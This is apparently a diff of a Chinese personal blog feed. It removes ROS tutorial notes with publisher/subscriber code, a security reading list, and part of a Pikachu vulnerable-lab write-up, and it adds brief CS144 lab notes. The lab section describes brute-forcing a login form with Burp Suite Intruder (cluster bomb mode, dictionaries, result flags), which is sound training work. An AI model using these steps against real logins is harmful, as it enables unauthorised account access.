-<p>添加后用<code>source .bashrc</code>重新加载它，这样以后执行不用再输入<code>source ./devel/setup.bash</code></p>
-</blockquote>
-<blockquote>
-<p>.xxx文件是隐藏文件，用<code>ctrl+h</code>将其显现出来</p>
-</blockquote>
-<p><strong>python版</strong> 同C++版</p>
-<h4 id="0x02-ROS集成环境搭建"><a href="#0x02-ROS集成环境搭建" class="headerlink" title="0x02 ROS集成环境搭建"></a>0x02 ROS集成环境搭建</h4><h5 id="安装终端"><a href="#安装终端" class="headerlink" title="安装终端"></a>安装终端</h5><p>ROS中，频繁用到终端且需要同时开启多个窗口，推荐Terminator及其快捷键。</p>
-<h5 id="安装VScode"><a href="#安装VScode" class="headerlink" title="安装VScode"></a>安装VScode</h5><p>☁详细看1.4.2 P28</p>
-<blockquote>
-<p><code>ctrl + =</code>放大  <code>ctrl + -</code>缩小  <code>ctrl + shift + b</code>编译  <code>ctrl + /</code>取消注释 <code>ctrl + shift + A</code>加注释</p>
-</blockquote>
-<h5 id="安装launch文件"><a href="#安装launch文件" class="headerlink" title="安装launch文件"></a>安装launch文件</h5><p>一个程序中可能需要启动多个节点，对“调用 rosrun 逐一启动”进行优化：使用 launch 文件，可以一次性启动多个 ROS 节点。</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">launch</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 添加被执行的节点 pkg是包 type是节点 name是节点名 --&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 乌龟GUI --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">node</span> <span class="attr">pkg</span>=<span class="string">&quot;helloworld&quot;</span> <span class="attr">type</span>=<span class="string">&quot;demo_hello&quot;</span> <span class="attr">name</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">output</span>=<span class="string">&quot;screen&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">node</span> <span class="attr">pkg</span>=<span class="string">&quot;turtlesim&quot;</span> <span class="attr">type</span>=<span class="string">&quot;turtlesim_node&quot;</span> <span class="attr">name</span>=<span class="string">&quot;t1&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">node</span> <span class="attr">pkg</span>=<span class="string">&quot;turtlesim&quot;</span> <span class="attr">type</span>=<span class="string">&quot;turtle_teleop_key&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key1&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">launch</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>参考执行乌龟程序时的<code>rosrun turtlesim turtlesim_node</code></p>
-<h4 id="0x03-ROS架构"><a href="#0x03-ROS架构" class="headerlink" title="0x03 ROS架构"></a>0x03 ROS架构</h4><p>💦本节建议在对ROS有一定经验后再回来学习（P31-P35）</p>
-<h5 id="ROS文件系统"><a href="#ROS文件系统" class="headerlink" title="ROS文件系统"></a>ROS文件系统</h5><h5 id="ROS文件系统相关命令"><a href="#ROS文件系统相关命令" class="headerlink" title="ROS文件系统相关命令"></a>ROS文件系统相关命令</h5><ol>
-<li>执行</li>
+<h5 id="2-2-writing-webget"><a href="#2-2-writing-webget" class="headerlink" title="2.2 writing webget"></a>2.2 writing webget</h5><p>编码实现类似于wget命令和1.1手动实现的内容。</p>
+<ol>
+<li>用到HTTP请求报文、TCPSocket和Address类；</li>
+<li>HTTP中每行以“\r\n”结尾而非单个”\n”；</li>
+<li>client要在收到“EOF”（server回复结束）前读并打印出所有的server输出（要多次read）；</li>
 </ol>
-<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">roscore</span></span><br><span class="line"><span class="variable">roscore</span> -<span class="variable">p</span> <span class="function"><span class="title">xxxx</span>(指定端口号)</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>roscore是 ROS 的系统先决条件节点和程序的集合， 必须运行 roscore 才能使 ROS 节点进行通信。</p>
+<h4 id="3-An-in-memory-reliable-byte-stream"><a href="#3-An-in-memory-reliable-byte-stream" class="headerlink" title="3 An in-memory reliable byte stream"></a>3 An in-memory reliable byte stream</h4><p>参考代码：<a href="https://www.epis2048.net/2022/cs144-lab0/">https://www.epis2048.net/2022/cs144-lab0/</a></p>
+<blockquote>
+<p>实验感想</p>
+<ol>
+<li><p>我的编程能力真的很差，写不出来，只能理解一下大佬的😵因此感觉代码非原创，博文发出来也没什么意思，指导书大家都会看。写实验报告的热情骤减。</p>
 </li>
-<li><p>roscore 将启动：ros master，ros 参数服务器，rosout 日志节点。</p>
+<li><p>CS144虚拟机密码设定要求一定强度，无语，每次输入都很累。</p>
 </li>
-<li><p>```shell<br>vivi@ubuntu:~$ roscore</p>
-<h1 id="日志写到哪去了"><a href="#日志写到哪去了" class="headerlink" title="日志写到哪去了"></a>日志写到哪去了</h1><p>… logging to /home/vivi/.ros/log/a6cd7df8-f5ea-11ec-8a5d-4d68047558b7/roslaunch-ubuntu-4173.log<br>Checking log directory for disk usage. This may take a while.<br>Press Ctrl-C to interrupt<br>Done checking log file disk usage. Usage is &lt;1GB.</p>
-<h1 id="在该端口上启动roslaunch-server"><a href="#在该端口上启动roslaunch-server" class="headerlink" title="在该端口上启动roslaunch server"></a>在该端口上启动roslaunch server</h1><p>started roslaunch server <a href="http://ubuntu:39577/">http://ubuntu:39577/</a><br>ros_comm version 1.15.14</p>
-<h1 id="ros摘要"><a href="#ros摘要" class="headerlink" title="ros摘要"></a>ros摘要</h1><h1 id="SUMMARY"><a href="#SUMMARY" class="headerlink" title="SUMMARY"></a>SUMMARY</h1><p>PARAMETERS</p>
-<ul>
-<li>/rosdistro: noetic</li>
-<li>/rosversion: 1.15.14</li>
-</ul>
-<h1 id="启动节点"><a href="#启动节点" class="headerlink" title="启动节点"></a>启动节点</h1><p>NODES</p>
-<p>auto-starting new master # 启动新的master节点<br>process[master]: started with pid [4183]<br>ROS_MASTER_URI=<a href="http://ubuntu:11311/">http://ubuntu:11311/</a></p>
-<p>setting /run_id to a6cd7df8-f5ea-11ec-8a5d-4d68047558b7<br>process[rosout-1]: started with pid [4193] # 启动日志输出rosout节点<br>started core service [/rosout]</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>rosrun 包名 可执行文件名</p>
-<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+ 运行指定的ROS节点，如`rosrun turtlesim turtlesim_node`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>roslaunch 包名 launch文件名</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">+ 执行某个包下的 launch 文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##### ROS计算图</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### 0x04 ROS通信机制</span></span><br><span class="line"></span><br><span class="line">ROS中每个功能点都是一个单独的进程，ROS是进程（也称为Nodes）的分布式框架。不同的进程是如何通信的？</span><br><span class="line"></span><br><span class="line">- 话题通信(发布订阅模式)</span><br><span class="line">- 服务通信(请求响应模式)</span><br><span class="line">- 参数服务器(参数共享模式)</span><br><span class="line"></span><br><span class="line"><span class="comment">##### 话题通信</span></span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;D:\blog\coriiiander\source\_posts\pictures\通信机制.jpg&quot;</span> alt=<span class="string">&quot;通信机制&quot;</span> style=<span class="string">&quot;zoom:67%;&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">适用于不断更新的数据传输相关的应用场景。理论模型（master注册时延会导致先接收后发送接收不到前几条数据，可通过休眠解决该问题&lt;我的一直接收不到数据&gt;）：</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">&quot;D:\blog\coriiiander\source\_posts\pictures\理论模型.jpg&quot;</span> alt=<span class="string">&quot;理论模型&quot;</span> style=<span class="string">&quot;zoom:30%;&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>. **话题通信基本操作** - 最基本的发布订阅模型，发布方以固定频率发送一段文本，订阅方接收文本并输出。</span><br><span class="line"></span><br><span class="line">**C++**</span><br><span class="line"></span><br><span class="line">```C</span><br><span class="line">/*</span><br><span class="line">    需求: 实现基本的话题通信，一方发布数据，一方接收数据，</span><br><span class="line">         实现的关键点:</span><br><span class="line">         <span class="number">1</span>.发送方</span><br><span class="line">         <span class="number">2</span>.接收方</span><br><span class="line">         <span class="number">3</span>.数据(此处为普通文本)</span><br><span class="line"></span><br><span class="line">         PS: 二者需要设置相同的话题</span><br><span class="line">/*</span><br><span class="line">/*</span><br><span class="line">    消息发布方:</span><br><span class="line">        循环发布信息:HelloWorld 后缀数字编号</span><br><span class="line"></span><br><span class="line">    实现流程:</span><br><span class="line">        <span class="number">1</span>.包含头文件 </span><br><span class="line">        <span class="number">2</span>.初始化 ROS 节点:命名(唯一)</span><br><span class="line">        <span class="number">3</span>.实例化 ROS 句柄</span><br><span class="line">        <span class="number">4</span>.实例化 发布者 对象</span><br><span class="line">        <span class="number">5</span>.组织被发布的数据，并编写逻辑发布数据</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"><span class="regexp">//</span> <span class="number">1</span>.包含头文件 </span><br><span class="line"><span class="comment">#include &quot;ros/ros.h&quot;</span></span><br><span class="line"><span class="comment">#include &quot;std_msgs/String.h&quot; //普通文本类型的消息</span></span><br><span class="line"><span class="comment">#include &lt;sstream&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char  *argv[])</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="regexp">//</span>设置编码</span><br><span class="line">    setlocale(LC_ALL,<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="regexp">//</span><span class="number">2</span>.初始化 ROS 节点:命名(唯一)</span><br><span class="line">    <span class="regexp">//</span> 参数<span class="number">1</span>和参数<span class="number">2</span> 后期为节点传值会使用</span><br><span class="line">    <span class="regexp">//</span> 参数<span class="number">3</span> 是节点名称，是一个标识符，需要保证运行后，在 ROS 网络拓扑中唯一</span><br><span class="line">    ros::init(argc,argv,<span class="string">&quot;talker&quot;</span>);</span><br><span class="line">    <span class="regexp">//</span><span class="number">3</span>.实例化 ROS 句柄</span><br><span class="line">    ros::NodeHandle nh;<span class="regexp">//</span>该类封装了 ROS 中的一些常用功能</span><br><span class="line"></span><br><span class="line">    <span class="regexp">//</span><span class="number">4</span>.实例化 发布者 对象</span><br><span class="line">    <span class="regexp">//</span>泛型: 发布的消息类型</span><br><span class="line">    <span class="regexp">//</span>参数<span class="number">1</span>: 要发布到的话题</span><br><span class="line">    <span class="regexp">//</span>参数<span class="number">2</span>: 队列中最大保存的消息数，超出此阀值时，先进的先销毁(时间早的先销毁)</span><br><span class="line">    ros::Publisher pub = nh.advertise&lt;std_msgs::String&gt;(<span class="string">&quot;chatter&quot;</span>,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="regexp">//</span><span class="number">5</span>.组织被发布的数据，并编写逻辑发布数据</span><br><span class="line">    <span class="regexp">//</span>数据(动态组织)</span><br><span class="line">    std_msgs::String msg;</span><br><span class="line">    <span class="regexp">//</span> msg.data = <span class="string">&quot;你好啊！！！&quot;</span>;</span><br><span class="line">    std::string msg_front = <span class="string">&quot;Hello 你好！&quot;</span>; <span class="regexp">//</span>消息前缀</span><br><span class="line">    int count = <span class="number">0</span>; <span class="regexp">//</span>消息计数器</span><br><span class="line"></span><br><span class="line">    <span class="regexp">//</span>逻辑(一秒<span class="number">10</span>次)</span><br><span class="line">    ros::Rate r(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="regexp">//</span>节点不死</span><br><span class="line">    <span class="keyword">while</span> (ros::ok())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="regexp">//</span>使用 stringstream 拼接字符串与编号</span><br><span class="line">        std::stringstream ss;</span><br><span class="line">        ss &lt;&lt; msg_front &lt;&lt; count;</span><br><span class="line">        msg.data = ss.str();</span><br><span class="line">        <span class="regexp">//</span>发布消息</span><br><span class="line">        pub.publish(msg);</span><br><span class="line">        <span class="regexp">//</span>加入调试，打印发送的消息</span><br><span class="line">        ROS_INFO(<span class="string">&quot;发送的消息:%s&quot;</span>,msg.data.c_str());</span><br><span class="line"></span><br><span class="line">        <span class="regexp">//</span>根据前面制定的发送贫频率自动休眠 休眠时间 = <span class="number">1</span>/频率；</span><br><span class="line">        r.sleep();</span><br><span class="line">        count++;<span class="regexp">//</span>循环结束前，让 count 自增</span><br><span class="line">        <span class="regexp">//</span>暂无应用</span><br><span class="line">        ros::spinOnce();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    消息订阅方:</span></span><br><span class="line"><span class="comment">        订阅话题并打印接收到的消息</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    实现流程:</span></span><br><span class="line"><span class="comment">        1.包含头文件 </span></span><br><span class="line"><span class="comment">        2.初始化 ROS 节点:命名(唯一)</span></span><br><span class="line"><span class="comment">        3.实例化 ROS 句柄</span></span><br><span class="line"><span class="comment">        4.实例化 订阅者 对象</span></span><br><span class="line"><span class="comment">        5.处理订阅的消息(回调函数)</span></span><br><span class="line"><span class="comment">        6.设置循环调用回调函数</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 1.包含头文件 </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ros/ros.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;std_msgs/String.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">doMsg</span><span class="params">(<span class="type">const</span> std_msgs::String::ConstPtr&amp; msg_p)</span>&#123;</span><br><span class="line">    ROS_INFO(<span class="string">&quot;我听见:%s&quot;</span>,msg_p-&gt;data.c_str());</span><br><span class="line">    <span class="comment">// ROS_INFO(&quot;我听见:%s&quot;,(*msg_p).data.c_str());</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>  *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    setlocale(LC_ALL,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="comment">//2.初始化 ROS 节点:命名(唯一)</span></span><br><span class="line">    ros::init(argc,argv,<span class="string">&quot;listener&quot;</span>);</span><br><span class="line">    <span class="comment">//3.实例化 ROS 句柄</span></span><br><span class="line">    ros::NodeHandle nh;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.实例化 订阅者 对象</span></span><br><span class="line">    ros::Subscriber sub = nh.subscribe&lt;std_msgs::String&gt;(<span class="string">&quot;chatter&quot;</span>,<span class="number">10</span>,doMsg);</span><br><span class="line">    <span class="comment">//5.处理订阅的消息(回调函数)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//     6.设置循环调用回调函数</span></span><br><span class="line">    ros::spin();<span class="comment">//循环读取接收的数据，并调用回调函数处理</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>vscode报错</strong>  <code>fatal error: &#39;ros/ros.h&#39; file not found #include &quot;ros/ros.h&quot;</code>，在terminal中打开执行<code>catkin_make</code>，显示100% 没报错，是vs编译器设置错了。vs编译器设置成了<code>C/C++:clang++ build active file</code>，应在Terminal → Configure Default Build Task 中点击<code>catkin_make:build</code>右边的齿轮<u>修改tasks.json文件</u>（1.4.2 P28中有详细介绍）</p>
-<p><strong>没设置INFO</strong> 发给接收方接收，没显示在显示端，用<code>rostopic echo 话题</code>查看。</p>
-<p><code>rqt_graph</code> 查看节点关系（计算图）&lt;我还没安这个命令&gt;。</p>
-<p><strong>python</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    需求: 实现基本的话题通信，一方发布数据，一方接收数据，</span></span><br><span class="line"><span class="string">         实现的关键点:</span></span><br><span class="line"><span class="string">         1.发送方</span></span><br><span class="line"><span class="string">         2.接收方</span></span><br><span class="line"><span class="string">         3.数据(此处为普通文本)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         PS: 二者需要设置相同的话题</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    消息发布方:</span></span><br><span class="line"><span class="string">        循环发布信息:HelloWorld 后缀数字编号</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    实现流程:</span></span><br><span class="line"><span class="string">        1.导包 </span></span><br><span class="line"><span class="string">        2.初始化 ROS 节点:命名(唯一)</span></span><br><span class="line"><span class="string">        3.实例化 发布者 对象</span></span><br><span class="line"><span class="string">        4.组织被发布的数据，并编写逻辑发布数据</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#1.导包 </span></span><br><span class="line"><span class="keyword">import</span> rospy</span><br><span class="line"><span class="keyword">from</span> std_msgs.msg <span class="keyword">import</span> String</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#2.初始化 ROS 节点:命名(唯一)</span></span><br><span class="line">    rospy.init_node(<span class="string">&quot;talker_p&quot;</span>)</span><br><span class="line">    <span class="comment">#3.实例化 发布者 对象</span></span><br><span class="line">    pub = rospy.Publisher(<span class="string">&quot;chatter&quot;</span>,String,queue_size=<span class="number">10</span>)</span><br><span class="line">    <span class="comment">#4.组织被发布的数据，并编写逻辑发布数据</span></span><br><span class="line">    msg = String()  <span class="comment">#创建 msg 对象</span></span><br><span class="line">    msg_front = <span class="string">&quot;hello 你好&quot;</span></span><br><span class="line">    count = <span class="number">0</span>  <span class="comment">#计数器 </span></span><br><span class="line">    <span class="comment"># 设置循环频率</span></span><br><span class="line">    rate = rospy.Rate(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> rospy.is_shutdown():</span><br><span class="line"></span><br><span class="line">        <span class="comment">#拼接字符串</span></span><br><span class="line">        msg.data = msg_front + <span class="built_in">str</span>(count)</span><br><span class="line"></span><br><span class="line">        pub.publish(msg)</span><br><span class="line">        rate.sleep()</span><br><span class="line">        rospy.loginfo(<span class="string">&quot;写出的数据:%s&quot;</span>,msg.data)</span><br><span class="line">        count += <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    需求: 实现基本的话题通信，一方发布数据，一方接收数据，</span></span><br><span class="line"><span class="string">         实现的关键点:</span></span><br><span class="line"><span class="string">         1.发送方</span></span><br><span class="line"><span class="string">         2.接收方</span></span><br><span class="line"><span class="string">         3.数据(此处为普通文本)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    消息订阅方:</span></span><br><span class="line"><span class="string">        订阅话题并打印接收到的消息</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    实现流程:</span></span><br><span class="line"><span class="string">        1.导包 </span></span><br><span class="line"><span class="string">        2.初始化 ROS 节点:命名(唯一)</span></span><br><span class="line"><span class="string">        3.实例化 订阅者 对象</span></span><br><span class="line"><span class="string">        4.处理订阅的消息(回调函数)</span></span><br><span class="line"><span class="string">        5.设置循环调用回调函数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#1.导包 </span></span><br><span class="line"><span class="keyword">import</span> rospy</span><br><span class="line"><span class="keyword">from</span> std_msgs.msg <span class="keyword">import</span> String</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">doMsg</span>(<span class="params">msg</span>):</span><br><span class="line">    rospy.loginfo(<span class="string">&quot;I heard:%s&quot;</span>,msg.data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#2.初始化 ROS 节点:命名(唯一)</span></span><br><span class="line">    rospy.init_node(<span class="string">&quot;listener_p&quot;</span>)</span><br><span class="line">    <span class="comment">#3.实例化 订阅者 对象</span></span><br><span class="line">    sub = rospy.Subscriber(<span class="string">&quot;chatter&quot;</span>,String,doMsg,queue_size=<span class="number">10</span>)</span><br><span class="line">    <span class="comment">#4.处理订阅的消息(回调函数)</span></span><br><span class="line">    <span class="comment">#5.设置循环调用回调函数</span></span><br><span class="line">    rospy.spin()</span><br></pre></td></tr></table></figure>
-
-
-
-<ol start="2">
-<li>实现对自定义消息的发布与订阅。</li>
 </ol>
-<p>std_msgs 封装了一些如String、Int32、Int64、Char、Bool、Empty的数据类型，这些数据一般只包含一个 data 字段，当传输如激光雷达的一些复杂数据时，结构的单一导致着功能上的局限性。</p>
-<h5 id="服务通信"><a href="#服务通信" class="headerlink" title="服务通信"></a>服务通信</h5><p>服务通信基于<strong>请求响应</strong>模式，是一种应答机制，也即: 一个节点A向另一个节点B发送请求，B接收处理请求并产生响应结果返回给A。它更适用于对<u>实时性</u>有要求、具有一定<u>逻辑处理</u>的应用场景，如：机器人巡逻时，控制系统分析传感器数据发现可疑物体或人…此时拍摄照片并留存。</p>
-<h5 id="参数服务器"><a href="#参数服务器" class="headerlink" title="参数服务器"></a>参数服务器</h5><p>用于实现不同节点之间的数据共享</p>
+</blockquote>
 ]]></content>
   </entry>
   <entry>
-    <title>bookList</title>
-    <url>/2022/07/05/bookList/</url>
-    <content><![CDATA[<p>☁作为安全专业学生，还是多学学安全吧🤕身边大佬好像都在学二进制安全，我也来浅浅入门一下🤕代码之家看起来像个病毒网站，我之前下电子书都跳过它，没想到里面有这么多资源😇不可貌相</p>
-<h5 id="1-逆向系列"><a href="#1-逆向系列" class="headerlink" title="1. 逆向系列"></a>1. 逆向系列</h5><p>《汇编语言》王爽老师的经典之作，了解学习基本的汇编指令，不论是pwn还是reverse都需要知道汇编的知识</p>
-<p>《逆向工程权威指南》也是经典之作，逆向工程入门经典书籍</p>
-<p>《C++<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E6%B1%87%E7%BC%96&spm=1001.2101.3001.7020">反汇编</a>与逆向分析技术揭秘》源代码和汇编结合举例，很详细，后面对熊猫烧香的分析也很详细</p>
-<p>《Android软件安全与<a href="https://so.csdn.net/so/search?q=%E9%80%86%E5%90%91%E5%88%86%E6%9E%90&spm=1001.2101.3001.7020">逆向分析</a>》介绍安卓逆向基础，后面出了2019的版本，可以看看2019的版本</p>
-<p>《逆向工程核心原理》逆向入门的好书，讲的非常细致，初学者可以买来看看</p>
-<p>《恶意代码分析实战》案例较多，适合有基础的朋友们看</p>
-<h5 id="2-操作系统基础"><a href="#2-操作系统基础" class="headerlink" title="2. 操作系统基础"></a>2. 操作系统基础</h5><p>《深入理解计算机系统》深入介绍计算机的原理，很详细，内容覆盖很广</p>
-<p>《程序员的自我修养》深入讲解了ELF，PE文件的链接过程，PWN基础学习的好书。作者荐书：</p>
-<p>intel手册 - <a href="http://www.intel.com/products/processor/manuals">http://www.intel.com/products/processor/manuals</a></p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\荐书1.png" alt="荐书1" style="zoom:67%;" />
-
-<img src="D:\blog\coriiiander\source\_posts\pictures\荐书2.png" alt="荐书2" style="zoom:67%;" />
-
-<p>《深入解析Windows操作系统》比较厚的书，分为上下册，详细的介绍了Windows的各种机制，就是不容易耐下性子来看 </p>
-<h5 id="3-漏洞系列"><a href="#3-漏洞系列" class="headerlink" title="3. 漏洞系列"></a>3. 漏洞系列</h5><p>《0day安全 软件漏洞分析技术》漏洞学习基础,里面有许多类型的漏洞分析</p>
-<p>《漏洞战争 软件漏洞分析精要》看完0day安全再看这本书，这本书以实战为主 </p>
-<h5 id="4-内核系列"><a href="#4-内核系列" class="headerlink" title="4. 内核系列"></a>4. 内核系列</h5><p><strong>Windows内核</strong></p>
-<p>《Windows内核情景分析》对内核的介绍非常详细，毛德操老师的著作</p>
-<p>《寒江独钓-Windows内核安全编程》内核安全编程很著名的一本书，适合入门</p>
-<p>《Windows内核安全与驱动开发》寒江独钓的升级版，年份上比寒江独钓新一些</p>
-<p>《Windows驱动开发技术详解》驱动开发入门书籍</p>
-<p><strong>Linux内核</strong></p>
-<p>《深入理解Linux内核(第三版)》详细介绍了Linux内核的知识，很著名的一本书 </p>
-<h5 id="5-编程系列"><a href="#5-编程系列" class="headerlink" title="5. 编程系列"></a>5. 编程系列</h5><p>《Windows黑客编程技术详解》里面有win32和内核的编程，介绍还算比较全面</p>
-<p>《Python编程从入门到实践》基础的python入门书籍，小白都可以看的懂 </p>
-<h5 id="6-其他"><a href="#6-其他" class="headerlink" title="6. 其他"></a>6. 其他</h5><p>《IDA Pro权威指南》深入理解IDA工具，神器不解释</p>
-<p>《加密与解密第四版》里面有很多综合的知识，ctf入门书籍，能详细的读完这本书，就算是很厉害了</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>pikachu</title>
-    <url>/2022/07/19/pikachu/</url>
-    <content><![CDATA[<p>☁pikachu：带有漏洞的Web应用系统，使用phpstudy搭建失败后使用buu环境。在实习公司电脑上搭建的环境，以后用到软件要重新搭是个烦心事… 通关参考：<a href="https://wuyandao.blog.csdn.net/article/details/121692906">https://wuyandao.blog.csdn.net/article/details/121692906</a></p>
-<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><blockquote>
-<p>慢慢学知识点吧😖很多时候我只想当个脚本小子、不求甚解，夯实基础真累🥴</p>
-</blockquote>
-<p>POST请求：</p>
-<p>GET请求：</p>
-<p>token：</p>
-<h4 id="Burt-Force"><a href="#Burt-Force" class="headerlink" title="Burt Force"></a>Burt Force</h4><p><strong>暴力破解漏洞</strong>：使用大量认证信息在认证接口进行尝试登录，为了提高效率，一般会使用带有字典的工具来进行自动化操作。理论上大多系统都可被暴力破解，我们说一个web应用系统存在暴力破解漏洞，一般指该web应用系统没有采用或采用了比较弱的认证安全策略(是否要求设置复杂密码；是否每次认证都使用安全的验证码或者手机otp；是否对尝试登录的行为进行判断和限制（账号锁定或IP地址锁定）；是否采用双因素认证），使其被暴力破解的“可能性”较高。</p>
-<p><strong>安装burpsuite</strong>：<a href="https://blog.csdn.net/LUOBIKUN/article/details/87457545">https://blog.csdn.net/LUOBIKUN/article/details/87457545</a></p>
-<blockquote>
-<p>查看java安装路径：cdm下<code>java -verbose</code>，我的是<code>D:\software\burpSuite\jdk-8u201-windows-x64\jdk</code></p>
-</blockquote>
-<p><strong>burpsuite使用：</strong>Firefox下载<code>proxy</code>插件并添加代理；Firefox 设置 → 常规 → 设置 中手动配置代理（<a href="http://burp/%E4%B8%AD%E4%B8%8B%E8%BD%BD%E8%AF%81%E4%B9%A6%EF%BC%8C%E5%9C%A8Firefox%E8%AE%BE%E7%BD%AE%E4%B8%AD%E5%AF%BC%E5%85%A5%E8%AF%81%E4%B9%A6%E5%8D%B3%E5%8F%AF%E6%8A%93http**s**%E7%9A%84%E5%8C%85%EF%BC%89">http://burp/中下载证书，在Firefox设置中导入证书即可抓http**s**的包）</a></p>
-<blockquote>
-<p>firefox设置代理后连不上网络：把burpsuite拦截请求关了（显示“拦截禁用”）。</p>
-</blockquote>
-<h5 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h5><blockquote>
-<p><strong>疑问</strong>：攻击字典如何设置？POST请求与GET请求？</p>
-</blockquote>
-<p>找到端口请求并发送到intruder。</p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\发送请求到Intruder.png" alt="发送请求到Intruder" style="zoom: 50%;" />
-
-<p>清理标记符并将账号和密码部分设置攻击标记符，设置攻击类型为cluster bomb。</p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\攻击标记符.png" alt="攻击标记符" style="zoom:50%;" />
-
-<ul>
-<li>Sniper模式逻辑：先将第一个变量替换，第二个变量不动。第一个变量替换完之后，依次替换第二个变量。只有一个字典。</li>
-<li>Battering ram模式逻辑：所有变量进行同时<strong>同样</strong>的替换。</li>
-<li>Pitchfork模式逻辑：所有变量按<strong>各自字典</strong>同时替换，不进行排列组合（1对1，2对2）。</li>
-<li>Cluster bomb模式逻辑：与Pitchfork类似，但会进行随机的排列组合。</li>
-</ul>
-<p>设置攻击字典</p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\攻击字典.png" alt="攻击字典" style="zoom:50%;" />
-
-<p>设置结果标志username or password is not exists（除去末尾的<code>～</code>，不然转义成<code>^</code>，会没有任何匹配）</p>
-<img src="D:\blog\coriiiander\source\_posts\pictures\结果标志.png" alt="结果标志" style="zoom:50%;" />
-
